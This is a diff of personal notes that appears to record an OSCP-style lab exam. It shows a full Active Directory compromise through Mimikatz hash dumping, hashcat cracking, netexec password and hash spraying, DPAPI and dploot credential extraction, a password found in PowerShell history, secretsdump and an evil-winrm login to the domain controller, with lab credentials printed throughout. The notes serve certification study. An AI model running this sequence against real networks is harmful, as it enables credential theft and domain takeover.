@@ -71,7 +71,7 @@ gobuster dir -u http://ms02.oscp.exam:47001/ -w /usr/share/wordlists/seclists/Di
 # aborted
 ```
 
-Feroxbuster mvp:
+Feroxbuster MVP:
 ```bash
 feroxbuster -u http://ms01.oscp.exam:8000 -o ms01_p8000.feroxbust
 
@@ -220,7 +220,6 @@ gobuster vhost -u http://192.168.222.153:47001 -w vhosts.txt --domain oscp.exam 
 => nothing (even without the domain ending option)
 
 ---
-
 # SMB
 
 ```bash
@@ -284,8 +283,12 @@ impacket-GetADUsers -all -dc-ip dc01 'oscp.exam/Eric.Wallows':'EricLikesRunning8
 
 # Check for creds in description
 netexec ldap dc01 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users
+# => nothing
 ```
-=> nope
+
+---
+# Skip until HERE
+
 
 # MSSQL
 
@@ -296,10 +299,9 @@ netexec mssql ms01 ms02 dc01 -u 'Eric.Wallows' -p 'EricLikesRunning800'
 impacket-mssqlclient 'OSCP/eric.wallows':'EricLikesRunning800'@ms02 -windows-auth
 impacket-mssqlclient 'OSCP/eric.wallows':'EricLikesRunning800'@ms02 -windows-auth -port 49700
 ```
-=> nothing 
+=> nothing in DB
 
----
-# Skip until HERE
+# PrivEsc
 
 ```powershell
 .\admintool.exe
@@ -311,7 +313,7 @@ impacket-mssqlclient 'OSCP/eric.wallows':'EricLikesRunning800'@ms02 -windows-aut
 # 
 # For more information try --help
 ```
-=> --help is the same output
+=> `--help` is the same output
 
 Supply argument:
 ```powershell
@@ -348,4 +350,238 @@ ssh administrator@ms01
 # December31
 ```
 
-TODO: MIMIMI
+# Mimikatz
+
+MS01:
+```
+* Username : MS01$
+* Domain   : OSCP
+* NTLM     : 753d28ce1c8167087f1995df474aaf96
+  
+SAM:
+User : Mary.Williams
+Hash NTLM: 9a3121977ee93af56ebd0ef4f527a35e
+
+User : support
+Hash NTLM: d9358122015c5b159574a88b3c0d2071
+
+
+Cache:
+User      : OSCP\Administrator
+MsCacheV2 : a3a38f45ff2adaf28e945577e9e2b57a
+```
+=> New: `Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e`
+=> Unable to crack OSCP\Administrator MsCacheV2 hash
+
+# Password Spraying - Lateral Movement
+
+Try to crack Mary's pw:
+```bash
+hashcat -m 1000 mary.ntlm /usr/share/wordlists/rockyou.txt
+# nope
+```
+
+creds.txt:
+```bash
+# Freedom1
+# December31
+```
+
+Spray Mary's hash (ad_users.txt does not contain mary and support. See separate cmds below):
+```bash
+## With Mary's hash
+
+netexec smb ms01 ms02 dc01 -u ad_users.txt -H '9a3121977ee93af56ebd0ef4f527a35e'
+netexec smb ms01 ms02 dc01 -u ad_users.txt -H '9a3121977ee93af56ebd0ef4f527a35e' --local-auth
+# nothing
+
+netexec mssql ms02 -u ad_users.txt -H '9a3121977ee93af56ebd0ef4f527a35e'
+netexec mssql ms02 -u ad_users.txt -H '9a3121977ee93af56ebd0ef4f527a35e' --local-auth
+# nothing
+
+netexec winrm ms01 ms02 dc01 -u ad_users.txt -H '9a3121977ee93af56ebd0ef4f527a35e'
+netexec winrm ms01 ms02 dc01 -u ad_users.txt -H '9a3121977ee93af56ebd0ef4f527a35e' --local-auth
+# nothing
+
+### With (administrator, support) passwords
+
+netexec smb ms01 ms02 dc01 -u ad_users.txt -p creds.txt
+netexec smb ms01 ms02 dc01 -u ad_users.txt -p creds.txt --local-auth
+# nothing
+
+netexec mssql ms02 -u ad_users.txt -p creds.txt
+netexec mssql ms02 -u ad_users.txt -p creds.txt --local-auth
+# nothing
+# same for --port 49700
+
+netexec winrm ms01 ms02 dc01 -u ad_users.txt -p creds.txt
+# nothing
+netexec winrm ms01 ms02 dc01 -u ad_users.txt -p creds.txt --local-auth
+# WINRM       192.168.226.153 5985   MS01             [+] MS01\Administrator:December31 (Pwn3d!)
+```
+=> nothing new
+
+Spray with the following users (local MS01 users, not part of ad_users):
+```bash
+# Mary.Williams
+# support
+```
+
+```bash
+netexec smb ms01 ms02 dc01 -u users.txt -H '9a3121977ee93af56ebd0ef4f527a35e'
+# nothing
+
+netexec smb ms01 ms02 dc01 -u users.txt -H '9a3121977ee93af56ebd0ef4f527a35e' --local-auth
+# SMB         192.168.226.153 445    MS01             [+] MS01\Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e
+
+netexec mssql ms01 ms02 dc01 -u users.txt -H '9a3121977ee93af56ebd0ef4f527a35e'
+netexec mssql ms01 ms02 dc01 -u users.txt -H '9a3121977ee93af56ebd0ef4f527a35e' --local-auth
+# nothing
+# same for --port 49700
+
+netexec winrm ms01 ms02 dc01 -u users.txt -H '9a3121977ee93af56ebd0ef4f527a35e'
+netexec winrm ms01 ms02 dc01 -u users.txt -H '9a3121977ee93af56ebd0ef4f527a35e' --local-auth
+# nothing
+
+netexec smb ms01 ms02 dc01 -u users.txt -p creds.txt --local-auth
+# SMB         192.168.226.153 445    MS01             [+] MS01\support:Freedom1
+
+netexec mssql ms01 ms02 dc01 -u users.txt -p creds.txt
+netexec mssql ms01 ms02 dc01 -u users.txt -p creds.txt --local-auth
+# nothing
+
+netexec winrm ms01 ms02 dc01 -u users.txt -p creds.txt --local-auth
+# WINRM       192.168.226.153 5985   MS01             [+] MS01\support:Freedom1 (Pwn3d!)
+```
+=> nothing new
+
+# SMB
+
+```bash
+netexec smb ms01 -u 'Mary.Williams' -H '9a3121977ee93af56ebd0ef4f527a35e' --local-auth --shares
+
+# SMB         192.168.226.153 445    MS01             Share           Permissions     Remark
+# SMB         192.168.226.153 445    MS01             -----           -----------     ------
+# SMB         192.168.226.153 445    MS01             ADMIN$                          Remote Admin
+# SMB         192.168.226.153 445    MS01             C$                              Default share
+# SMB         192.168.226.153 445    MS01             IPC$            READ            Remote IPC
+# SMB         192.168.226.153 445    MS01             setup
+
+netexec smb ms01 -u 'support' -p Freedom1 --local-auth --shares
+# same shares/privs as above
+```
+=> nothing interesting
+
+# Credential Search
+
+Logged in via SSH as administrator.
+
+winPEAS:
+```powershell
+iwr -uri http://192.168.45.168/winPEAS.ps1 -outfile winPEAS.ps1
+.\winPEAS.ps1
+```
+
+winPEAS results:
+```
+C:\Windows\System32\config\SAM Found!
+C:\Windows\System32\config\SYSTEM Found!
+```
+
+## DPAPI
+
+```bash
+# List Cred Manager Blob
+ls -Force AppData\Local\Microsoft\Credentials\
+
+# In Mimikatz
+dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+# guidMasterKey      : {d976c605-e232-4c02-9c33-c5be484210f7}
+
+# List masterkeys
+ls -Force .\AppData\Roaming\Microsoft\Protect\S-1-5-21-2114389728-3978811169-1968162427-500\
+
+dpapi::masterkey /in:C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2114389728-3978811169-1968162427-500\d976c605-e232-4c02-9c33-c5be484210f7 /password:December31
+# key : 984b6da582bf9e45449726107e6b954cfcffcc79cf5d0bcc788cf028dc0d543d659887fddd0003ad63cd238cee4d81b25067558fde54d47d902188658b047722
+
+# In Mimikatz
+dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:984b6da582bf9e45449726107e6b954cfcffcc79cf5d0bcc788cf028dc0d543d659887fddd0003ad63cd238cee4d81b25067558fde54d47d902188658b047722
+```
+=> nothing interesting
+
+dploot:
+```bash
+dploot credentials -t 192.168.226.153 -u Administrator -p December31
+# dploot (https://github.com/zblurx/dploot) v3.1.2 by @_zblurx
+# [*] Connected to 192.168.226.153 as \Administrator (admin)
+
+# [*] Triage ALL USERS masterkeys
+
+# {13556bce-e3e2-4bbc-9d16-49612c9fff6a}:58ff71f57a08de28ed019306feda7d45669d3f44
+# {38270e6e-a515-4984-aaf7-b8f858a922a6}:1ee396d30ad3cbd7b76195eb41f5fe447001a620
+# {88fc78fb-94d7-4ac8-9781-7f6e67b20483}:97a4ae116edb0d9a2a7ef15b2d18c90ac45facc2
+# {d976c605-e232-4c02-9c33-c5be484210f7}:9f2db3b924dcb7ae700b34d0ef0372927cac3156
+# {dac8fc05-2c28-4f47-a7be-fa26e6b624a4}:f4e2ff14ace6da0be71395cb10ae8bc934779ba0
+# {e34c4066-72ae-43a8-b2e1-dc2d0a408803}:202cbc857546ed4452e1b1af267063e1ff5266ab
+
+# [*] Triage Credentials for ALL USERS
+
+
+ploot rdg -t 192.168.226.153 -u Administrator -p December31        
+# dploot (https://github.com/zblurx/dploot) v3.1.2 by @_zblurx
+# [*] Connected to 192.168.226.153 as \Administrator (admin)
+
+# [*] Triage ALL USERS masterkeys
+# ...
+
+# [*] Triage RDCMAN Settings and RDG files for ALL USERS
+
+
+dploot vaults -t 192.168.226.153 -u Administrator -p December31
+# [*] Triage ALL USERS masterkeys
+# ...
+
+# [*] Triage Vaults for ALL USERS
+```
+=> nothing
+
+# History
+
+```powershell
+(Get-PSReadlineOption).HistorySavePath
+# C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+type "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+# C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+# ...
+```
+=> PW: hghgib6vHT3bVWf
+
+Spray:
+```bash
+netexec winrm ms01 ms02 dc01 -u ad_users.txt -p hghgib6vHT3bVWf -d "oscp.exam"
+# nothing
+
+netexec winrm ms01.oscp.exam ms02.oscp.exam dc01.oscp.exam -u administrator -p hghgib6vHT3bVWf --local-auth
+# WINRM       10.10.186.154   5985   MS02             [+] MS02\administrator:hghgib6vHT3bVWf (Pwn3d!)
+```
+=> BINGO!!!
+
+# MS02
+
+Dump creds:
+```bash
+impacket-secretsdump 'administrator':'hghgib6vHT3bVWf'@ms02.oscp.exam
+# [*] DefaultPassword 
+# OSCP.exam\Administrator:7Tg9M9MZbzAokR9
+```
+:) GG
+
+# DC01
+
+```bash
+evil-winrm -i dc01 -u 'oscp.exam\administrator' -p '7Tg9M9MZbzAokR9'
+
+type C:\Users\Administrator\Desktop\proof.txt
+# 298fe2be3297aecda85ee521712c41f8
+```
